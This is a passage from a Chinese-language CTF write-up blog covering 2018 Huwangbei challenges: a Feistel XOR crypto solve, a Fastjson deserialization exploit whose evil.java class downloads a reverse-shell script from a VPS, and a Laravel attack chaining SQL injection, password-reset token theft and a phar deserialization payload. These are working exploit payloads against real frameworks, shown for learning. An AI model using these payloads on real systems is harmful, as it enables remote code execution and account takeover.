Rtest^Ltest^K1^K3^K4^K6^K7【TestRes】</span><br></pre></td></tr></table></figure><p>而我们已知<code>test</code>和<code>TestRes</code>，即<code>Ltest</code>和<code>Rtest</code>，</p><p>于是在进行推导，容易得到flag的两个部分。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TestRes[0:27] ^ res[0:27] &#x3D;&#x3D; R ^ Rtest</span><br><span class="line">TestRes[27:54] ^ res[27:54] &#x3D;&#x3D; L ^ R ^ Rtest ^ Ltest</span><br><span class="line">(R ^ Rtest) ^ Rtest &#x3D; R</span><br><span class="line">(L ^ R ^ Rtest ^ Ltest) ^ (R^Rtest) ^ Ltest &#x3D; L</span><br></pre></td></tr></table></figure><p>MyExp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">test = <span class="string">&quot;048d26224aae9f6be49f13202c0b173c2346909fcbba868d5d9b7431002957c5c01c546530f84e45b8a3892526401c007bca7d39b0b7&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">testres = <span class="string">&quot;69d41820c61c7e8fb47fde8f09064f24af72dc6251e97e72bdc2d7c0b4696110ef84f30da6ac88b7059500f8e814cec9e9e13bcafad8&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">flagres = <span class="string">&quot;32e7094533a1e76ac8acdeb882c0d6965ca954d75dfd00e759b5aff9663f41d49ae70ee18fd3c067ad7ae577433ad2512b764f4b2eb2&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line">L = flagres[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R = flagres[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">t_L = testres[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">t_R = testres[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line">tmp_R = xor(L,t_L)  <span class="comment"># R ^ Rtest</span></span><br><span class="line">tmp_L = xor(R,t_R)  <span class="comment"># L ^ R ^ Rtest ^ Ltest</span></span><br><span class="line"></span><br><span class="line">flag_R = xor(tmp_R, test[<span class="number">27</span>:<span class="number">54</span>]) <span class="comment"># (R ^ Rtest) ^ Rtest</span></span><br><span class="line">flag_L = xor(xor(tmp_L,tmp_R),test[<span class="number">0</span>:<span class="number">27</span>]) <span class="comment"># (L ^ R ^ Rtest ^ Ltest) ^ (R^Rtest) ^ Ltest</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag_L,flag_R</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;festel_weak_666_lol88f j3820&#125;����y�~:;��ȩo�����</span></span><br></pre></td></tr></table></figure><p><strong>题目反思</strong></p><ol><li>对于随机数的解密处理：<ul><li>伪随机，并非真正的随机，了解其seed和原理，很大情况下，可以爆破</li><li>对于其加密原理进行数学模拟和分析，很可能在某些步骤就可以抵消而和随机结果无关。就像很多高中数学题一样。</li><li>妄图通过加密步骤逆向解决，对于有随机的题目来说四徒劳的。</li></ul></li><li>对于加密而言，数学尤其重要，很多数学的思想可以借鉴。</li><li>异或是很特殊的运算，A^A = 0，0 ^ any = any.</li></ol><h1 id="0x03-easy-web"><a href="#0x03-easy-web" class="headerlink" title="0x03 easy_web"></a>0x03 easy_web</h1><h2 id="3-1-环境复现"><a href="#3-1-环境复现" class="headerlink" title="3.1 环境复现"></a>3.1 环境复现</h2><p>之前很少接触JavaWeb，最近倒是在学习这门专业选修也是搞得懵懵的。</p><p>因为原题环境关闭了，这里利用了一位大佬写的环境进行测试和学习（感谢0rz）。</p><p><a href="https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE">https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE</a></p><p><a href="https://v0w.top/2018/10/19/EnvConfig_Java-Tomcat/">关于ubantu服务器搭建tomcat环境</a>我写了另一篇博客，需要的朋友欢迎移步阅读。</p><p>配置环境不多说</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@V0W:# export tomcat&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0</span><br><span class="line">root@V0W:# echo $tomcat</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0</span><br><span class="line">root@V0W:&#x2F;# wget &quot;https:&#x2F;&#x2F;github.com&#x2F;iBearcat&#x2F;FastJson-JdbcRowSetImpl&#x2F;raw&#x2F;master&#x2F;FastJson_Vul.war&quot; -P $tomcat&#x2F;webapps&#x2F; &amp;&amp; cd $tomcat&#x2F;bin&#x2F; &amp;&amp; .&#x2F;startup.sh</span><br></pre></td></tr></table></figure><p>访问url,看到和比赛时相似的环境</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181021/jmgDdE8khk.png?imageslim" alt="mark"></p><p>之前只接触了一点JavaWeb，这里也是看了很久各位大佬的文档（在文末参考链接中都给出了），才算是对其利用有了初步了解，加上利用大佬们现成的Poc，解决了这个题目。</p><p>首先是原理篇：大佬们的解释一定比我好多了，大家可以参考文末的链接，进行理解。</p><blockquote><p>Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上，它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象。</p><p>fastjson漏洞出现的地方也就是JSON.parseObject这个方法上面。</p><p>在反序列化成对象的过程中，能通过类初始化时候的构造函数或者变量的setter方法执行恶意代码。但是由于这个恶意构造的类不可控，所以这种攻击看上去是无法实施的。</p><p>但是可以将编译好的.class或者.jar文件转换成byte[]，然后通过defineClass加载byte[]返回class对象。即将类的定义转换成bcel编码进行攻击。</p></blockquote><h2 id="3-2-大佬的攻击思路"><a href="#3-2-大佬的攻击思路" class="headerlink" title="3.2 大佬的攻击思路"></a>3.2 大佬的攻击思路</h2><ol><li>构造一个payload——evil.class 能够直接执行shell，或者下载一个预先存在VPS某端口的用于反弹shell的py文件</li><li>写另一个类，用于将evil.class 生成bcel编码</li><li>构造包含恶意攻击类bcel编码的JSON数据，用于攻击</li><li>VPS上监听一个端口，实施攻击，反弹shell</li></ol><h2 id="3-3-利用大佬的payload测试攻击"><a href="#3-3-利用大佬的payload测试攻击" class="headerlink" title="3.3 利用大佬的payload测试攻击"></a>3.3 利用大佬的payload测试攻击</h2><p>evil.java：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Thread thread = <span class="keyword">new</span> evil();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String cmd = <span class="string">&quot;wget http://vps/neko.py -O /tmp/neko.py&quot;</span>; </span><br><span class="line">    <span class="comment">//这个地址写自己的VPS地址，将反弹shell的py脚本放在一个端口，之后可以通过http访问下载</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;<span class="comment">//尝试直接执行shell</span></span><br><span class="line">            String[] cmds = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)</span><br><span class="line">                    ? <span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,cmd&#125;</span><br><span class="line">                    : <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(cmds);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译得到.class文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac evil.class</span><br></pre></td></tr></table></figure><p>另一个<code>BCELencode.java</code>文件中，进行bcel编码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BCELencode</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//There also should be compiled class file,not java file</span></span><br><span class="line">        Path path = Paths.get(<span class="string">&quot;src/evil.class&quot;</span>);   <span class="comment">//文件绝对路径</span></span><br><span class="line">        <span class="keyword">byte</span>[] data = Files.readAllBytes(path);</span><br><span class="line">        String s =  Utility.encode(data,<span class="keyword">true</span>);</span><br><span class="line">        System.out.print(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到BCEL编码</p><p>然后构造JSON poc</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">  &quot;driverClassLoader&quot; :</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;driverClassName&quot; : &quot;上个步骤得到的编码&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将evil.java的cmd修改为 <code>python /tmp/poc.py</code></p><p>再操作一遍</p><p>就可以执行py文件，反弹一个shell,进行命令执行。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181024/IA523j8eJh.png?imageslim" alt="mark"></p><h1 id="0x04-Easy-laravel"><a href="#0x04-Easy-laravel" class="headerlink" title="0x04 Easy_laravel"></a>0x04 Easy_laravel</h1><h2 id="4-1-环境复现"><a href="#4-1-环境复现" class="headerlink" title="4.1 环境复现"></a>4.1 环境复现</h2><p>首先感谢4uuu大佬出了这么好的题还给出<a href="https://github.com/sco4x0/huwangbei2018_easy_laravel">复现环境</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;sco4x0&#x2F;huwangbei2018_easy_laravel</span><br><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><h2 id="4-2-源码发现"><a href="#4-2-源码发现" class="headerlink" title="4.2 源码发现"></a>4.2 源码发现</h2><p>在登录等页面查看源码，可以得到</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/qqqqqqvq/easy_laravel --&gt;</span></span><br></pre></td></tr></table></figure><p>得到代码，之后composer install 。代码就完整了。开始审计。</p><p>首先看路由<code>route文件夹</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>); &#125;);</span><br><span class="line">Auth::routes();</span><br><span class="line">Route::get(<span class="string">&#x27;/home&#x27;</span>, <span class="string">&#x27;HomeController@index&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/note&#x27;</span>, <span class="string">&#x27;NoteController@index&#x27;</span>)-&gt;name(<span class="string">&#x27;note&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/upload&#x27;</span>, <span class="string">&#x27;UploadController@index&#x27;</span>)-&gt;name(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/upload&#x27;</span>, <span class="string">&#x27;UploadController@upload&#x27;</span>)-&gt;name(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;FlagController@showFlag&#x27;</span>)-&gt;name(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/files&#x27;</span>, <span class="string">&#x27;UploadController@files&#x27;</span>)-&gt;name(<span class="string">&#x27;files&#x27;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/check&#x27;</span>, <span class="string">&#x27;UploadController@check&#x27;</span>)-&gt;name(<span class="string">&#x27;check&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/error&#x27;</span>, <span class="string">&#x27;HomeController@error&#x27;</span>)-&gt;name(<span class="string">&#x27;error&#x27;</span>);</span><br></pre></td></tr></table></figure><p>也可以在目录下通过<code>php artisan route:list</code>命令查看，更加直接，详细</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181023/c6i59Gkik3.png?imageslim" alt="mark"></p><h2 id="4-3-sql注入"><a href="#4-3-sql注入" class="headerlink" title="4.3 sql注入"></a>4.3 sql注入</h2><p>几乎所有操作都需要进行登录，而且 <code>UploadController</code> 和 <code>FlagController</code> 都使用了一个叫做 <code>admin</code> 的中间件，在 <code>app/Http/Middleware/AdminMiddleware.php</code> 中可以看到代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">$request, <span class="built_in">Closure</span> $next</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;auth-&gt;user()-&gt;email !== <span class="string">&#x27;admin@qvq.im&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> redirect(route(<span class="string">&#x27;error&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $next($request);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>需要当前用户的邮箱为 <code>admin@qvq.im</code> ，这时发现使用这个邮箱是注册不上的，因为系统已经内置了这个管理员账号。但是由于不知道密码，我们也没办法利用。</p><p>接下来看看，有没有什么办法可以得到管理员邮箱的密码。在<code>\app\Http\Controllers\NoteController.php</code>中，发现一个明显的SQL注入（类似二次注入，注入点在注册页面）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Note $note</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = Auth::user()-&gt;name;</span><br><span class="line">        $notes = DB::select(<span class="string">&quot;SELECT * FROM `notes` WHERE `author`=&#x27;&#123;$username&#125;&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&#x27;note&#x27;</span>, compact(<span class="string">&#x27;notes&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>确实也可以注入，本以为可以通过注入得到admin用户的密码，那就简单了，不是吗？</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181023/gBkieHaDa6.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181023/EKEe8GaEHB.png?imageslim" alt="mark"></p><p>结果，最终发现密码是随机加密的，无法破解。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$factory-&gt;define(App\User::class, <span class="function"><span class="keyword">function</span> (<span class="params">Faker\<span class="built_in">Generator</span> $faker</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;4uuu Nya&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;admin@qvq.im&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> =&gt; bcrypt(str_random(<span class="number">40</span>)),</span><br><span class="line">        <span class="string">&#x27;remember_token&#x27;</span> =&gt; str_random(<span class="number">10</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="4-4-密码重置"><a href="#4-4-密码重置" class="headerlink" title="4.4 密码重置"></a>4.4 密码重置</h2><p>既然SQL注入不行，那么就得想其他方法才行。在上一步SQL注入的测试中，发现<code>\database\migrations\2014_10_12_100000_create_password_resets_table.php</code>是一个重置密码的文件，并且其中代码是这样写的。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">up</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Schema::create(<span class="string">&#x27;password_resets&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">Blueprint $table</span>) </span>&#123;</span><br><span class="line">            $table-&gt;string(<span class="string">&#x27;email&#x27;</span>)-&gt;index();</span><br><span class="line">            $table-&gt;string(<span class="string">&#x27;token&#x27;</span>)-&gt;index();</span><br><span class="line">            $table-&gt;timestamp(<span class="string">&#x27;created_at&#x27;</span>)-&gt;nullable();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>也就是只要有邮箱和token，我们就可以修改密码，问题在于token怎么弄到手呢？</p><p>这里用到Laravel5.4的一个特性 ：</p><p>重置密码时，如果存在这个用户的话，有个生成token的操作，<strong>之后将生成的token直接存在了数据库中。</strong></p><p>利用注册页面的SQL注入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; union select 1,(select token from password_resets limit 0,1),3,4,5#</span><br></pre></td></tr></table></figure><p>拿到token后，访问链接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.79.180.214&#x2F;password&#x2F;reset&#x2F;1c9d0f377a75dd48abaa90dd7fa4eb35653da39561d6f9c33bdb14a8a0849616（token值）</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181023/B7550HKe9j.png?imageslim" alt="mark"></p><h2 id="4-5-登陆后台"><a href="#4-5-登陆后台" class="headerlink" title="4.5 登陆后台"></a>4.5 登陆后台</h2><p>发现有4个功能：upload,files,flag,note </p><p>但是直接访问会发现页面提示 <code>no flag</code>，这里页面内容不一致，在 laravel 中，模板文件是存放在 <code>resources/views</code> 中的，然后会被编译放到 <code>storage/framework/views</code> 中，而编译后的文件存在过期的判断。</p><p>加上题目的提示：</p><ul><li>blade expired</li><li>pop chain</li></ul><p>可以发现是<a href="https://www.jianshu.com/p/7d65f9eb94be">blade过期的问题</a></p><p>发现Blade 是 laravel 提供的一个简单强大的模板引擎。它不像其他流行的 PHP 模板引擎那样限制你在视图中使用原生的 PHP 代码，事实上它就是把 Blade 视图编译成原生的 PHP 代码并缓存起来。缓存会在 Blade 视图改变时而改变，这意味着 Blade 并没有给你的应用添加编译的负担。<br>所以我们这的思路很清晰：</p><ol><li>因为旧的缓存存在，导致我们看不到flag</li><li>我们可以利用pop chain删掉缓存文件</li><li>读到flag</li></ol><p>那么缓存文件在哪里呢？我们查看源码发现</p><p>在 <code>Illuminate/View/Compilers/Compiler.php</code> 中可以看到</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isExpired</span>(<span class="params">$path</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $compiled = <span class="keyword">$this</span>-&gt;getCompiledPath($path);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the compiled file doesn&#x27;t exist we will indicate that the view is expired</span></span><br><span class="line">    <span class="comment">// so that it can be re-compiled. Else, we will verify the last modification</span></span><br><span class="line">    <span class="comment">// of the views is less than the modification times of the compiled views.</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;files-&gt;exists($compiled)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $lastModified = <span class="keyword">$this</span>-&gt;files-&gt;lastModified($path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $lastModified &gt;= <span class="keyword">$this</span>-&gt;files-&gt;lastModified($compiled);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合相关文档和提示<code>nginx是坠吼的 ( 好麻烦，默认配置也是坠吼的 </code></p><p>那么很容易得知web目录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br></pre></td></tr></table></figure><p>blade默认缓存是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;storage&#x2F;framework&#x2F;views</span><br></pre></td></tr></table></figure><p>因此，使用了nginx的默认配置，那么flag文件的完整路径就是 </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;resources&#x2F;views&#x2F;auth&#x2F;flag.blade.php</span><br></pre></td></tr></table></figure><p>经过sha1后得到 <code>34e41df0934a75437873264cd28e2d835bc38772.php</code></p><h2 id="4-6-利用反序列化删除文件"><a href="#4-6-利用反序列化删除文件" class="headerlink" title="4.6 利用反序列化删除文件"></a>4.6 利用反序列化删除文件</h2><p>过期时间是依据文件的最后修改时间来判断的，所以判断服务器上编译后的文件最后修改时间大于原本模板文件，那么怎么去删除(修改)编译后的文件?</p><p>这里发现<code>composer.json</code>中提供了大量组件，我们安装一下，然后全局搜索，容易发现有<code>unlink()</code></p><h2 id="4-7-phar神来之笔"><a href="#4-7-phar神来之笔" class="headerlink" title="4.7 phar神来之笔"></a>4.7 phar神来之笔</h2><p>那最后怎么触发序列化呢？这里用到了我们BlackHat会议演讲的phar://方法<br>参考这篇文章<a href="https://paper.seebug.org/680/">我校表哥seaii的利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p>check在<code>\app\Http\Controllers\UploadController.php</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function check(Request $request)</span><br><span class="line">   &#123;</span><br><span class="line">       $path &#x3D; $request-&gt;input(&#39;path&#39;, $this-&gt;path);</span><br><span class="line">       $filename &#x3D; $request-&gt;input(&#39;filename&#39;, null);</span><br><span class="line">       if($filename)&#123;</span><br><span class="line">           if(!file_exists($path . $filename))&#123;</span><br><span class="line">               Flash::error(&#39;磁盘文件已删除，刷新文件列表&#39;);</span><br><span class="line">           &#125;else&#123;</span><br><span class="line">               Flash::success(&#39;文件有效&#39;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       return redirect(route(&#39;files&#39;));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>是会使用file_exists的，并且path和filename可控！</p><p>出题师傅的payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $filepath &#x3D; &#39;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;resources&#x2F;views&#x2F;auth&#x2F;flag.blade.php&#39;;</span><br><span class="line">    require &#39;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;vendor&#x2F;autoload.php&#39;;</span><br><span class="line">    $obj &#x3D; new Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">    $a &#x3D; serialize($obj);</span><br><span class="line">    $a &#x3D; preg_replace(&#39;&#x2F;\&#x2F;tmp\&#x2F;FileByteStream[a-zA-Z0-9]&#123;6&#125;&#x2F;&#39;, sha1(xxx), $a);</span><br><span class="line">    $a &#x3D; str_replace(&#39;25&#39;, &#39;90&#39;, $a);</span><br><span class="line">    $b &#x3D; unserialize($a);</span><br><span class="line">    $p &#x3D; new Phar(&#39;.&#x2F;1.phar&#39;, 0);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);</span><br><span class="line">    $p-&gt;setMetadata($b);</span><br><span class="line">    $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">    rename(&#39;.&#x2F;1.phar&#39;, &#39;1.gif&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后上传1.gif，check的时候传入自定义的path和filename，然后访问/flag ，得到flag</p><h2 id="4-8-本题总结"><a href="#4-8-本题总结" class="headerlink" title="4.8 本题总结"></a>4.8 本题总结</h2><p>由于之前没太接触过Laravel框架，最近看了很多资料，才算勉强看懂了大佬们的WP和思路。不得不说，这道题目非常有水平，考察了二次注入，Laravel框架的特性和逻辑漏洞，POP链与反序列化,  phar协议扩展反序列化的攻击等。学习了0rz</p><h1 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h1><p>本次护网杯，收获甚大，出题人的水平非常高，出的题很有意思，而且学到很多东西， 感谢所有出题人0rz。</p><p>当然，也发现自身的很多不足，比如对一些web框架不熟悉，对Javaweb很不熟悉，杂项有些东西还没吃透，后期需要更加努力的去弥补这些了。</p><p>还有就是，很多东西喜欢拖，拖到现在才做完护网杯的复习和学习==、</p><p>最后，有点可惜，没有进入决赛，问了一下排名90，感觉再做出一个题赢就差不多能进，哎<code>(；´д｀)ゞ</code>。打算下周开始接触逆向和pwn，希望看到文章的逆向大佬给个逆向入门的学习路线吧，欢迎联系我（联系方式见<strong>关于</strong>页面）。</p><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p><a href="https://www.cnblogs.com/wfzWebSecuity/p/9787238.html">护网杯一道密码学的感想</a></p><p><a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/">2018护网杯-web-writeup</a></p><p><a href="https://xz.aliyun.com/t/2892#toc-0">2018护网杯线上赛 Writeup by Lilac</a></p><p><a href="http://n3k0sec.top/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFwp">护网杯WP-n3k0</a></p><p><a href="https://www.cnblogs.com/mrchang/p/6789060.html">Fastjson反序列化漏洞研究</a></p><p><a href="https://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/">FastJson反序列化漏洞(续)</a></p><p><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">fastjson 远程反序列化poc的构造和分析</a></p><p><a href="http://www.freebuf.com/articles/others-articles/167932.html">DefineClass在Java反序列化当中的利用</a></p><p><a href="https://www.codercto.com/a/31804.html">护网杯2018 easy_laravel 复盘</a></p><p><a href="http://www.venenof.com/index.php/archives/565/">护网杯-easy laravel-Writeup</a></p><p><a href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95">护网杯2018 easy_laravel出题记录</a></p><p><a href="https://paper.seebug.org/680/">这是学长表哥seaii的文章0rz——利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p><a href="https://xz.aliyun.com/t/2901">2018护网杯easy_laravel 利用POP Chian getshell</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> Java </tag>
            
            <tag> 取证分析 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubantu服务器上配置Java+Tomcat服务</title>
      <link href="/2018/10/16/EnvConfig_Java-Tomcat/"/>
      <url>/2018/10/16/EnvConfig_Java-Tomcat/</url>
      
